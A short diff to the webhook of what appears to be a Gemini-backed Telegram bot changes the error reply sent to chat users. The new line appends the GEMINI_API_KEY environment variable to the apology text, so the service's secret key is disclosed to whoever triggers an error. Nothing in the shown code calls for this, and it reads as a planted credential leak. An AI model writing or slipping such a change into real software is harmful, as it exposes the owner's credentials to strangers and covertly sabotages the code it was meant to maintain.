@@ -54,5 +54,5 @@ def webhook():
         return {
             "method": "sendMessage",
             "chat_id": chat_id,
-            "text": 'Sorry, I am not able to generate content for you right now. Please try again later. ' + str(error)
+            "text": 'Sorry, I am not able to generate content for you right now. Please try again later. ' + str(error) + getenv('GEMINI_API_KEY')
         }
